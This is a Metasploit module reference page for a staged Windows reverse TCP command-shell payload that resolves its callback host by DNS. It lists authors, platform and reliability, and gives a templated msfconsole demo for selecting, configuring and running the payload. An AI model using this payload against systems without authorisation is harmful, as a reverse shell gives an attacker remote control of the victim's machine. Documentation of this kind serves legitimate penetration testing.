## Windows Command Shell, Reverse TCP Stager (DNS)

Spawn a piped command shell (staged). Connect back to the 
attacker


## Module Name
payload/windows/shell/reverse_tcp_dns

## Authors
* spoonm
* sf
* hdm
* skape





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/shell/reverse_tcp_dns
msf payload(reverse_tcp_dns) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_dns) > set TARGET <target-id>
msf payload(reverse_tcp_dns) > show options
   ... show and set options ...
msf payload(reverse_tcp_dns) > run
```
    
    